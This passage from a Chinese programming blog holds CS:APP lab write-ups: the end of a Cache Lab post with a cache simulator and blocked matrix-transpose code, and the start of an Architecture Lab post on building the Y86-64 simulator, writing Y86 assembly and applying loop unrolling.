hits，直接返回。没有的话就是cache misses，这个时候需要从内存中读取，然后我们还要将这个地址及其对应的值放入缓存当中。</li><li>对于store指令，往内存中写入，首先我们还是需要判断要存储的目标地址是否放在缓存当中。如果有的话，由于我们采用的是write back策略，我们只需要将值存储在cache当中，只有当其要被替换时，我们才将其写入到内存当中。如果没有的话，发生cache misses这个时候我们需要从内存中读取，在放入缓存当中，在缓存中进行修改。</li><li>对于modify指令，其实就是先执行load指令，再执行store指令。</li></ol><p>　　实验要求我们输出hits，misses, evicts的次数，并不需要保存缓存中每一个block的值，并且，题目保证了load和store的时候不会越过某一个block的边界，进一步使题目变简单。细心的你可能会发现，我们不需要对三种指令分别进行相应操作。load 和 store指令在本题中没有区别。我们可以将这两个指令分别拆分成两个部分：</p><ol><li>search 搜索对应的set块中是否存在缓存，存在的话则cache hits，更新lru后直接返回，否则发生cache misses，进行第二步</li><li>insert 首先判断当前set块中是否还存在空的line，存在的话我们将其填上，然后返回。不存在的话发生cache evicts，这个时候，由于我们不需要管各个地址中的值，只需要更新一下lru和tag即可。</li></ol><p>　　对于modify，由于load如果缓存中不存在的时候，会从内存中找并且放入缓存当中，因此，store指令一定是cache hits。我们相当与只需要执行load，然后hits++即可。<br>　　附：lru(least recently use)在本题中用时间戳表示。每读取一个指令时间戳+1。因此可以保证后一个进缓存的或者后一个被访问到的lru一定更大。我们每次替换的时候只需要找lru最小的那个即可。</p><p>　　核心代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="built_in">fscanf</span>(fs, <span class="string">"%s %llx,%d"</span>, is, &amp;address, &amp;size) != EOF) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is[<span class="number">0</span>] == <span class="string">'I'</span>) <span class="keyword">continue</span>;</span><br><span class="line">    address &gt;&gt;= blockSize;</span><br><span class="line">    <span class="built_in">set</span> = address % maxSet;</span><br><span class="line">    address &gt;&gt;= setNum;</span><br><span class="line">    tag = address;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Line</span>* <span class="title">line</span> = <span class="title">sets</span>[<span class="title">set</span>].<span class="title">line</span>;</span></span><br><span class="line">    <span class="keyword">int</span> m = sets[<span class="built_in">set</span>].m;                           <span class="comment">// m 表示编号为set中已经用了的行数(m &lt;= E)</span></span><br><span class="line">    <span class="keyword">if</span> (search(line, m, tag, lru) != <span class="number">-1</span>) hits++;   <span class="comment">// cache hits 时search返回-1</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        misses++;</span><br><span class="line">        <span class="keyword">int</span> pos = try_insert(line, m, tag, lru);   <span class="comment">// try insert 如果有空位，返回-1，没有空位，则返回lru最小的那个值</span></span><br><span class="line">        <span class="keyword">if</span> (pos != <span class="number">-1</span>) &#123;</span><br><span class="line">            evicts++;</span><br><span class="line">            evict(line, pos, tag, lru);            <span class="comment">// 将lru最小的那个line替换掉</span></span><br><span class="line">        &#125; <span class="keyword">else</span> sets[<span class="built_in">set</span>].m++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is[<span class="number">0</span>] == <span class="string">'M'</span>) hits++;</span><br><span class="line">    lru++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="part-B"><a href="#part-B" class="headerlink" title="part B"></a>part B</h4><p>　　这道题总体来说还是挺难的。尤其是64 * 64的那个部分。笔者最后也想不出比较好的办法。在参考了网上的一些资料之后，最终才拿到了满分。当然32 * 32和61 * 67那块还是比较简单的。题目所给的cache的参数为s = 5, b = 5, E = 1，于是我们知道，这是一个直接映射的cache，sets总数为32。记住cache的参数对于题目的解决及其重要。</p><h5 id="32-32"><a href="#32-32" class="headerlink" title="32 * 32"></a>32 * 32</h5><p>　　首先，这道题其实和之前的performance lab很像。不过我们的目的是减少cache misses的次数，而不是减少cpe，因此重心应该放在cache上。我们可以画一个表来表示出各个元素映射到的set编号。由于32byte的block恰好可以放8个int变量，而一行一共有32个，也就是说每一行占用了4个set，8行可以将所有set填满。第九行开始则有重复之前的周期。因此，我们可以采用8 * 8的分块法，尽可能地减少miss数。<br>　　当然，如果你直接这样做，你会发现，这样还是通不了，miss数为三百多，而满分是300以内。其实还有一个重要的可以用到的优化(笔者一开始也没有注意到)。<br>　　官方给的文档中有提示，我们最多只能用到12个局部变量。而目前我们仅用了4个(四个循环)。还有8个可以用，并且8个还恰好就是一个set能存放的int数，这个时候我们发现，我们可以先将A矩阵中一整个块(8个变量)取出来，放在局部变量当中，然后再逐一赋值给B矩阵中对应的位置，这样可以避免掉很多不必要的miss(A矩阵每一个块最多只会发生1次miss，而且是必要的)，避免了A矩阵和B矩阵相互争夺某一个set导致的conflict miss。于是我们就可以成功地将miss数减少到300以内。成功解决。代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> K 8</span></span><br><span class="line"><span class="keyword">int</span> t1, t2, t3, t4, t5, t6, t7, t0;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i+=K)</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j+=K)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> l = i; l &lt; i+K &amp;&amp; l &lt; N; l++) &#123;</span><br><span class="line">  t0 = A[l][j];</span><br><span class="line">  t1 = A[l][j+<span class="number">1</span>];</span><br><span class="line">  t2 = A[l][j+<span class="number">2</span>];</span><br><span class="line">  t3 = A[l][j+<span class="number">3</span>];</span><br><span class="line">  t4 = A[l][j+<span class="number">4</span>];</span><br><span class="line">  t5 = A[l][j+<span class="number">5</span>];</span><br><span class="line">  t6 = A[l][j+<span class="number">6</span>];</span><br><span class="line">  t7 = A[l][j+<span class="number">7</span>];</span><br><span class="line">  B[j][l] = t0;</span><br><span class="line">  B[j+<span class="number">1</span>][l] = t1;</span><br><span class="line">  B[j+<span class="number">2</span>][l] = t2;</span><br><span class="line">  B[j+<span class="number">3</span>][l] = t3;</span><br><span class="line">  B[j+<span class="number">4</span>][l] = t4;</span><br><span class="line">  B[j+<span class="number">5</span>][l] = t5;</span><br><span class="line">  B[j+<span class="number">6</span>][l] = t6;</span><br><span class="line">  B[j+<span class="number">7</span>][l] = t7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h5 id="61-67"><a href="#61-67" class="headerlink" title="61 * 67"></a>61 * 67</h5><p>　　为什么要把这个放在这个地方呢？当然是因为这个比较简单了。61 * 67长宽均是质数，很大一定程度上使得miss数会少一些，当然，这也使得很难通过一些优化将miss减少到一个很低的数值。题目要求的miss数是2000以内，其实只要分块的大小选取得当就很简单了。笔者选择的是16 * 8的块，当然，16 * 16的听说也可以。这个比较随意了，就是一个调参的过程而已。理解清楚之后，和前面那道32 * 32的基本没有区别，代码就不贴了，意义不大。</p><h5 id="64-64"><a href="#64-64" class="headerlink" title="64 * 64"></a>64 * 64</h5><p>　　这个应该就是这个lab最难的一个点了。由于每一行有64个int值，因此，每一行需要占用8个set，即4行就可以把set填满。因此，如果还是采用8 * 8的分块的话，第5～8行占用的set和第1～4行是一样的，这就会导致B矩阵每一次取值都是miss。总的miss率会特别高，显然不恰当。<br>　　而如果我们尝试这采用4 * 4的分块法呢？很明显，4 * 4可以避免上面的这种情况。然而又带来了另一个问题，4 * 4中cache的利用率太低了，每次读取8个int，最后用到的却只有4个，因此，这种做法最后miss数大概是1600+，离满分还有很大距离。笔者就是在这里想了很久还是不懂。最后还是去网上看了一下一些其他的思路，最后才恍然大悟(但总觉得这道题有点太取巧了)。下面是我最后获得满分的一个思路(如果涉及侵权，请及时联系我删除)：<br>　　为了使得cache的利用率达到最大，我们还是得采用8 * 8的分块法，但是，同样的又要避免第5～8行和第1～4行发生conflict miss，我们不能一次性对一整列8个数字进行填充。最后我们采用的策略基于矩阵转置以下的性质：<br>　　对于任意矩阵A，我们将A的转置矩阵记为A<sup>T</sup>。对于每一个8 * 8的块，我们可以将其分成4个4 * 4的子矩阵。分别记为A<sub>1</sub>，A<sub>2</sub>，A<sub>3</sub>，A<sub>4</sub>。对与A的转置操作，我们可以分解为如下：<br><img src="/2019/01/29/csapp-Cachelab/1.png" width="300" height="400" alt="分解" align="center"><br>　　由此，我们可以将整个8 * 8的矩阵的转置分解为以下的三个步骤。</p><ol><li>对A矩阵的上半部分处理，每次读取A的一行，将A坐上角部分转置后放在B的左上角处，将A右上角转置后放在B的<b>右上角</b></li><li>对A矩阵的左下角部分进行处理，<b>按列读取</b>A的右下角中的每一列(4个数字)，再<b>按行读取</b>B右上角中的每一行，然后将A读取到的四个数字横放在B的右上角，再将B读取到的四个数字放在B的左下角。本质上其实就等价于将左下角转置后放在B的右上角，将B右上角中上一步得到的数字放在了B的左下角。</li><li>对A矩阵的右下角部分进行处理，将A<sub>右下</sub>转置并放到B<sub>右下</sub>当中</li></ol><p>　　其中，第二步是最关键的部分。为什么这样能够减少miss数呢？如果我们假设4 * 4矩阵平均的miss数为n的话，对于上面三个步骤，我们每一步产生的miss数均大致为n，也就是说，对于一个8 * 8的矩阵，我们的miss数由原先所需的4n降低到了3n。第一步和第三步为n这个很好理解，第二步建议自己再画图理解清楚。最后我们得到的miss数为1100+，而4 * 4的分块约为1600，这也和我们的估计值基本相当。<br><img src="/2019/01/29/csapp-Cachelab/2.png" width="80%" height="50%" alt="步骤" align="center"></p><p>　　以下是代码，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> t1, t2, t3, t4, t5, t6, t7, t0;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i+=K) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j+=K) &#123;</span><br><span class="line">        <span class="comment">// 以下循环将A左上转置后移动到B坐上</span></span><br><span class="line">        <span class="comment">// 将A右上转置后移动到B右上</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> ii = i; ii &lt; i + <span class="number">4</span>; ii++) &#123;</span><br><span class="line">            t0 = A[ii][j];</span><br><span class="line">            t1 = A[ii][j+<span class="number">1</span>];</span><br><span class="line">            t2 = A[ii][j+<span class="number">2</span>];</span><br><span class="line">            t3 = A[ii][j+<span class="number">3</span>];</span><br><span class="line">            t4 = A[ii][j+<span class="number">4</span>];</span><br><span class="line">            t5 = A[ii][j+<span class="number">5</span>];</span><br><span class="line">            t6 = A[ii][j+<span class="number">6</span>];</span><br><span class="line">            t7 = A[ii][j+<span class="number">7</span>];</span><br><span class="line">            B[j][ii] = t0;</span><br><span class="line">            B[j+<span class="number">1</span>][ii] = t1;</span><br><span class="line">            B[j+<span class="number">2</span>][ii] = t2;</span><br><span class="line">            B[j+<span class="number">3</span>][ii] = t3;</span><br><span class="line">            B[j][ii+<span class="number">4</span>] = t4;</span><br><span class="line">            B[j+<span class="number">1</span>][ii+<span class="number">4</span>] = t5;</span><br><span class="line">            B[j+<span class="number">2</span>][ii+<span class="number">4</span>] = t6;</span><br><span class="line">            B[j+<span class="number">3</span>][ii+<span class="number">4</span>] = t7;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将A左下角转置并移动到B右上角</span></span><br><span class="line">        <span class="comment">// 将B右上角移动到B左下角</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> jj = j; jj &lt; j + <span class="number">4</span>; jj++) &#123;</span><br><span class="line">            t0 = A[i+<span class="number">4</span>][jj];</span><br><span class="line">            t1 = A[i+<span class="number">5</span>][jj];</span><br><span class="line">            t2 = A[i+<span class="number">6</span>][jj];</span><br><span class="line">            t3 = A[i+<span class="number">7</span>][jj];</span><br><span class="line">            t4 = B[jj][i+<span class="number">4</span>];</span><br><span class="line">            t5 = B[jj][i+<span class="number">5</span>];</span><br><span class="line">            t6 = B[jj][i+<span class="number">6</span>];</span><br><span class="line">            t7 = B[jj][i+<span class="number">7</span>];</span><br><span class="line">            B[jj][i+<span class="number">4</span>] = t0;</span><br><span class="line">            B[jj][i+<span class="number">5</span>] = t1;</span><br><span class="line">            B[jj][i+<span class="number">6</span>] = t2;</span><br><span class="line">            B[jj][i+<span class="number">7</span>] = t3;</span><br><span class="line">            B[jj+<span class="number">4</span>][i] = t4;</span><br><span class="line">            B[jj+<span class="number">4</span>][i+<span class="number">1</span>] = t5;</span><br><span class="line">            B[jj+<span class="number">4</span>][i+<span class="number">2</span>] = t6;</span><br><span class="line">            B[jj+<span class="number">4</span>][i+<span class="number">3</span>] = t7;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将A右下转置后移动到B右下</span></span><br><span class="line">        t0 = A[i+<span class="number">4</span>][j+<span class="number">4</span>];</span><br><span class="line">        t1 = A[i+<span class="number">4</span>][j+<span class="number">5</span>];</span><br><span class="line">        t2 = A[i+<span class="number">4</span>][j+<span class="number">6</span>];</span><br><span class="line">        t3 = A[i+<span class="number">4</span>][j+<span class="number">7</span>];</span><br><span class="line">        t4 = A[i+<span class="number">5</span>][j+<span class="number">4</span>];</span><br><span class="line">        t5 = A[i+<span class="number">5</span>][j+<span class="number">5</span>];</span><br><span class="line">        t6 = A[i+<span class="number">5</span>][j+<span class="number">6</span>];</span><br><span class="line">        t7 = A[i+<span class="number">5</span>][j+<span class="number">7</span>];</span><br><span class="line">        B[j+<span class="number">4</span>][i+<span class="number">4</span>] = t0;</span><br><span class="line">        B[j+<span class="number">5</span>][i+<span class="number">4</span>] = t1;</span><br><span class="line">        B[j+<span class="number">6</span>][i+<span class="number">4</span>] = t2;</span><br><span class="line">        B[j+<span class="number">7</span>][i+<span class="number">4</span>] = t3;</span><br><span class="line">        B[j+<span class="number">4</span>][i+<span class="number">5</span>] = t4;</span><br><span class="line">        B[j+<span class="number">5</span>][i+<span class="number">5</span>] = t5;</span><br><span class="line">        B[j+<span class="number">6</span>][i+<span class="number">5</span>] = t6;</span><br><span class="line">        B[j+<span class="number">7</span>][i+<span class="number">5</span>] = t7;</span><br><span class="line"></span><br><span class="line">        t0 = A[i+<span class="number">6</span>][j+<span class="number">4</span>];</span><br><span class="line">        t1 = A[i+<span class="number">6</span>][j+<span class="number">5</span>];</span><br><span class="line">        t2 = A[i+<span class="number">6</span>][j+<span class="number">6</span>];</span><br><span class="line">        t3 = A[i+<span class="number">6</span>][j+<span class="number">7</span>];</span><br><span class="line">        t4 = A[i+<span class="number">7</span>][j+<span class="number">4</span>];</span><br><span class="line">        t5 = A[i+<span class="number">7</span>][j+<span class="number">5</span>];</span><br><span class="line">        t6 = A[i+<span class="number">7</span>][j+<span class="number">6</span>];</span><br><span class="line">        t7 = A[i+<span class="number">7</span>][j+<span class="number">7</span>];</span><br><span class="line">        B[j+<span class="number">4</span>][i+<span class="number">6</span>] = t0;</span><br><span class="line">        B[j+<span class="number">5</span>][i+<span class="number">6</span>] = t1;</span><br><span class="line">        B[j+<span class="number">6</span>][i+<span class="number">6</span>] = t2;</span><br><span class="line">        B[j+<span class="number">7</span>][i+<span class="number">6</span>] = t3;</span><br><span class="line">        B[j+<span class="number">4</span>][i+<span class="number">7</span>] = t4;</span><br><span class="line">        B[j+<span class="number">5</span>][i+<span class="number">7</span>] = t5;</span><br><span class="line">        B[j+<span class="number">6</span>][i+<span class="number">7</span>] = t6;</span><br><span class="line">        B[j+<span class="number">7</span>][i+<span class="number">7</span>] = t7;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="关于driver-py文件"><a href="#关于driver-py文件" class="headerlink" title="关于driver.py文件"></a>关于driver.py文件</h3><p>　　driver.py是用python语言编写的脚本文件。在做这个任务时，笔者电脑中python的版本是3.7。运行driver.py的时候，出现了异常错误。经打开后发现，这个文件中的python的版本应该是3.0以前的，由于python2.x 和 python3.x的一些语法做了大幅度的修改，因此该文件无法正常运行。如果你也遇到了同样的错误，可以尝试这用以下方法解决：</p><ol><li>将文件中所有print 后面的表达式加上一个括号。如print “Hello world” 应改为 print(“Hello world”)。python3.0开始就已经不再使用print x这种类型的表达式了。</li><li>将所有调用到subprocess.Popen函数的式子括号内再加上<b>universal_newlines=True</b>参数。如83～84行应该改为<b>p = subprocess.Popen(“./test-trans -M 61 -N 67 | grep TEST_TRANS_RESULTS”, shell=True, stdout=subprocess.PIPE, universal_newlines=True)</b></li><li>89行改为<b>csim_cscore  = list(map(int, resultsim[0:1]))</b></li></ol><h3 id="关于前面的archlab-32和performance-lab"><a href="#关于前面的archlab-32和performance-lab" class="headerlink" title="关于前面的archlab-32和performance-lab"></a>关于前面的archlab-32和performance-lab</h3><p>　　这两个实验没有写博客。archlab-32和archlab题目上基本没有什么很大的差别，大体的解决思路类似，因此基本上没有什么重复写博客的必要。然后performance-lab则是因为这个实验难度比较小，没有什么可以写的(虽然这个实验我还是有做的)，基本上就是简单的loop unrolling加上分块就可以拿到比较好的分数了。而且题目和Chapter 6的最后两道课后题很类似。这里就不再赘述了。</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> cache </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>csapp-Archlab</title>
      <link href="/2019/01/18/csapp-Archlab/"/>
      <url>/2019/01/18/csapp-Archlab/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这是csapp系列的第五篇文章。具体题目请见<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">官网</a>。本文主要讲csapp中的architecture lab的流程和心得。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话)。<br>　　同样的，在正式开始实验之前，建议先把官方的<a href="http://csapp.cs.cmu.edu/3e/archlab.pdf" target="_blank" rel="noopener">资料</a>看一遍，保证对实验需要做什么，怎么做有一定的了解。总体来说，本实验在不追求满分的情况下，还是很容易通过的。主要难度都是在part C上，尤其要优化到高分十分困难，笔者最后的得分为56.3/60.0，仅供参考。</p><h2 id="architecture-lab-实验要求"><a href="#architecture-lab-实验要求" class="headerlink" title="architecture lab 实验要求"></a>architecture lab 实验要求</h2><p>　　这个实验总共分为三个部分，part A, part B, part C。其中，第一部分要求我们将三个用C写的函数翻译成y86-64指令，第二部分要求我们往seq ISA中添加一个新的指令iaddq。第三个部分给了我们一个ncopy的函数和一个pipeline的hcl文件，要求我尽可能地加快程序运行的速度。结果是用CPE(cycles per element)来衡量。达到9.0即算实验通过，7.5为满分。</p><blockquote><p>实验文件(主要用到的在三个文件夹当中)<br>misc：part A 需要用到的文件夹<br>seq： part B 所在文件夹<br>pipe：part C 所在文件夹</p></blockquote><blockquote><p>实验目的</p><ol><li>加深对CPU的指令集架构的了解，理解pipeline的基本实现原理</li><li>理解hardware和software之间的基本联系。简单了解它们之间是如何配合协作的</li><li>掌握一些程序优化的简单方法</li></ol></blockquote><h2 id="y86-64-模拟器的配置"><a href="#y86-64-模拟器的配置" class="headerlink" title="y86-64 模拟器的配置"></a>y86-64 模拟器的配置</h2><p>　　个人认为，这个应该是本实验最麻烦的一个点了。花了很长的时间，出了各种bug，下面进行安装过程进行简单的介绍。<br>　　所用系统为:arch-linux。不同版本对同一个问题的解决方法可能不太一样，但大体上有相似之处，下面仅供参考</p><h3 id="tcl-tk"><a href="#tcl-tk" class="headerlink" title="tcl/tk"></a>tcl/tk</h3><p>　　如果不想安装GUI界面的同学可以忽略此步<br>　　首先，本实验比较老，需要用到的tcl/tk版本号为8.5，8.6以上的版本没办法正常使用。然而，现在直接下载默认的应该是8.6版本的，因此我们需要制定版本号。在arch下，本人是直接使用yay（需要自行安装）进行下载。</p><blockquote><p>yay tcl85 // yay tk85</p></blockquote><p>　　这样的命令行即可。然后我们进入sim文件夹下。使用make编译。发现报错了。出现了类似这样的错误信息。</p><p><img src="/2019/01/18/csapp-Archlab/1.png" alt="错误1"></p><p>　　我们需要更改makefile文件。如下图所示(记得对照清楚一下)。<br><img src="/2019/01/18/csapp-Archlab/2.png" alt="错误2"></p><p>　　再次进行编译。又报出新的错误。错误信息大概是这样。</p><blockquote><p>psim.c:23:10: fatal error: tk.h: No such file or directory</p><p>#include &lt;tk.h&gt;<br>compilation terminated.</p></blockquote><p>　　看错误信息，我们发现，编译的时候找不到tk.h这个函数库。因此，我们去系统的函数库里面看一下，进入Root/usr/include文件夹下，ctrl+f搜索，我们发现tk.h放在了tk8.5这个文件夹下，因此编译的时候在include文件夹下找不到tk.h。我们只需要将psim.c中的tk.h更改为tk8.5/tk.h即可。(同理，ssim.c也需要修改)<br>　　好了，这个时候再次编译，我们又发现还是过不了。出现了类似这样的错误信息。</p><blockquote><p>/usr/bin/ld: /tmp/cc44VPBY.o:(.data.rel+0x0): underfined reference to ‘matherr’</p></blockquote><p>　　matherr没有定义？？这是怎么回事。我们进入matherr所在文件(psim.c和ssim.c)看一下。找到了这样的两行代码：</p><blockquote><p>extern int matherr();<br>int *tclDummyMathPtr = (int *) matherr;</p></blockquote><p>　　直接注释掉即可。最后，我们再进行编译。在sim文件夹下make clean; make 我们成功地完成了GUI界面的编译。当然，要是过不了也没有什么关系，我们可以把上面图片中makefile那三行注释掉，这样编译出来的是文本界面，但不需要tcl/tk，也就不会一直报错了。</p><h2 id="实验正文"><a href="#实验正文" class="headerlink" title="实验正文"></a>实验正文</h2><h3 id="part-A"><a href="#part-A" class="headerlink" title="part A"></a>part A</h3><p>　　这部分其实没什么好讲的。就是简单地把一个函数翻译成y86-64代码而已。在misc文件夹下新建文件sum.ys，把自己翻译的代码打进去然后用yas编译，yis运行即可，最终%rax的数据为0xcba即正确了。自己可以进行校对。下面是我的sum.ys的代码。其余两个不贴上来了。主要是注意一下一开是要先设置pos，还有把栈顶放在%rsp上面即可。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.pos <span class="number">0</span></span><br><span class="line">init: irmovq Stack, %rsp</span><br><span class="line">      call Main</span><br><span class="line">      halt</span><br><span class="line"></span><br><span class="line">.align <span class="number">8</span></span><br><span class="line">ele1:</span><br><span class="line">.quad <span class="number">0x00a</span></span><br><span class="line">.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">.quad <span class="number">0x0b0</span></span><br><span class="line">.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">.quad <span class="number">0xc00</span></span><br><span class="line">.quad <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Main:</span><br><span class="line">irmovq ele1,%rdi</span><br><span class="line">call sum_list</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">sum_list:</span><br><span class="line">irmovq $<span class="number">0</span>,%rax</span><br><span class="line">jmp test</span><br><span class="line">loop:</span><br><span class="line">mrmovq <span class="number">0</span>(%rdi),%rcx</span><br><span class="line">addq %rcx,%rax</span><br><span class="line">mrmovq <span class="number">8</span>(%rdi),%rcx</span><br><span class="line">rrmovq %rcx,%rdi</span><br><span class="line">test:</span><br><span class="line">andq %rdi,%rdi</span><br><span class="line">jne loop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">.pos <span class="number">0x100</span></span><br><span class="line">Stack:</span><br></pre></td></tr></table></figure></p><h3 id="part-B"><a href="#part-B" class="headerlink" title="part B"></a>part B</h3><p>　　这个部分同样比较简单，添加一个IIADDQ指令。文件位于/seq/seq-full.hcl 我们只需要在以下几个变量中添加IIADDQ的判断即可。</p><ol><li>instr_valid</li><li>need_regids</li><li>need_valC</li><li>dstE中结果为rB的分支</li><li>aluA中结果为valC的分支</li><li>aluB中结果为valB的分支</li><li>setCC</li></ol><p>　　经过资料中的几个测试后，该题顺利解决。</p><h3 id="part-C"><a href="#part-C" class="headerlink" title="part C"></a>part C</h3><p>　　这道题很难，尤其是如果要追求满分的话。当然，要有分也没那么容易。在pipe文件夹下：</p><blockquote><p>./correctness.pl  // 检测自己的答案是否正确<br>./benchmark.pl // 测试自己的分数是多少</p></blockquote><p>　　这道题我们能操作的文件就只有pipe.hcl和ncopy.ys。也就是说，分别从硬件和软件两个方面进行优化。首先是hcl文件，很显然，官方资料已经提示了我们，本题需要实现iaddq指令，这样做起来方便很多，可以将CPE降到13左右吧。虽然还是0分。具体和part B极其相似，这里不再赘述。<br>　　由于资料中还提示我们，建议去看loop unrolling的部分，这告诉了我们，本题最大的优化在循环展开这里。于是，笔者不得不先提前去看了一下书上循环优化部分的内容。为什么循环优化能够提高那么多呢？<br>　　注意到我们的每次循环过程中，迭代器都要+1，并且src和dst两个指针也要对应地发生移动，然而，这样的指令对于我们答案的得出并没有实质性的直接帮助，因此，我们应该尽量减少这样的指令的产生比如：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n; i++)</span><br><span class="line">sum += a[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n; i+=<span class="number">2</span>)</span><br><span class="line">sum = sum + a[i] + a[i+<span class="number">1</span>];</span><br></pre></td></tr></table></figure></p><p>　　两个程序进行对比，很明显，下面的程序的效率要远远高于上面那个。尤其当n越大时，效果更明显。而题目给的程序中，需要递增的有三个数，这就使得循环优化变得更加重要。对于循环k路的选择上面，个人选择了k = 8。即每次n的变化应该是8。总体上来说，和四路的效率比较接近。具体实现过程中，整体思路是，先将n - k, 然后再进行n/k轮迭代，最后再把余数进行处理。具体可以见最下方的参考<br>　　进行了循环优化以后，我们还发现，程序中有类似这样的两行。</p><blockquote><p>mrmovq (%rdi),%r10<br>rmmovq %r10,(%rsi)</p></blockquote><p>　　记性比较好的读者应该会记得，书中有提到过这样的例子。第二行的rmmovq指令执行到decode stage时，上面那一行还在execute 